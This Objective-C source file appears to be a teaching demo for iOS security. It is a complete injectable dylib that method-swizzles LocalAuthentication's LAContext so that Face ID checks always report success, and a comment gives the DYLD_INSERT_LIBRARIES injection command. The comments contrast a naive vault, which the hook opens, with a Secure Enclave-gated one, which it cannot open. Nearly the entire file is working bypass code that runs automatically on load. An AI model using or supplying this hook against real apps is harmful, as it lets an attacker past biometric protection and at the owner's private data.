// FaceIDBypass.m
//
// A tiny injectable dylib that method-swizzles Apple's LocalAuthentication
// framework. It is the classic "just return YES" biometric bypass.
//
// The point of this demo is to SEE it work against the Naive Vault and SEE it
// do nothing against the Secure Vault, because the second one is gated by the
// Secure Enclave and not by the boolean we forge here.
//
// Build: see build_dylib.sh
// Inject (simulator): SIMCTL_CHILD_DYLD_INSERT_LIBRARIES=.../libFaceIDBypass.dylib \
//                     xcrun simctl launch --console <udid> <bundle-id>

#import <Foundation/Foundation.h>
#import <objc/runtime.h>

typedef void (^LAReplyBlock)(BOOL success, NSError *error);

// Original implementations we save so we can log around them.
static void (*orig_evaluatePolicy)(id, SEL, NSInteger, NSString *, LAReplyBlock);
static BOOL (*orig_canEvaluatePolicy)(id, SEL, NSInteger, NSError **);

static void swizzled_evaluatePolicy(id self, SEL _cmd,
                                    NSInteger policy,
                                    NSString *reason,
                                    LAReplyBlock reply) {
    NSLog(@"[FaceIDBypass] evaluatePolicy intercepted (policy=%ld, reason=%@)", (long)policy, reason);
    NSLog(@"[FaceIDBypass] --> forging reply(YES, nil), sensor never consulted");
    if (reply) {
        reply(YES, nil);
    }
    // Note: we deliberately do NOT call the original. The whole trick is to
    // never touch the real biometric pipeline.
}

static BOOL swizzled_canEvaluatePolicy(id self, SEL _cmd,
                                       NSInteger policy,
                                       NSError **error) {
    NSLog(@"[FaceIDBypass] canEvaluatePolicy intercepted --> forcing YES");
    if (error) { *error = nil; }
    return YES;
}

static void swizzle(Class cls, SEL sel, IMP newImp, IMP *origStore) {
    Method m = class_getInstanceMethod(cls, sel);
    if (!m) {
        NSLog(@"[FaceIDBypass] method %@ not found on %@", NSStringFromSelector(sel), cls);
        return;
    }
    *origStore = (void *)method_getImplementation(m);
    method_setImplementation(m, newImp);
    NSLog(@"[FaceIDBypass] swizzled %@ on %@", NSStringFromSelector(sel), cls);
}

__attribute__((constructor))
static void FaceIDBypass_init(void) {
    NSLog(@"[FaceIDBypass] dylib loaded, installing hooks...");

    Class LAContext = objc_getClass("LAContext");
    if (!LAContext) {
        NSLog(@"[FaceIDBypass] LAContext not present; is LocalAuthentication linked?");
        return;
    }

    swizzle(LAContext,
            @selector(evaluatePolicy:localizedReason:reply:),
            (IMP)swizzled_evaluatePolicy,
            (IMP *)&orig_evaluatePolicy);

    swizzle(LAContext,
            @selector(canEvaluatePolicy:error:),
            (IMP)swizzled_canEvaluatePolicy,
            (IMP *)&orig_canEvaluatePolicy);

    NSLog(@"[FaceIDBypass] hooks installed. Naive vault is now wide open.");
}
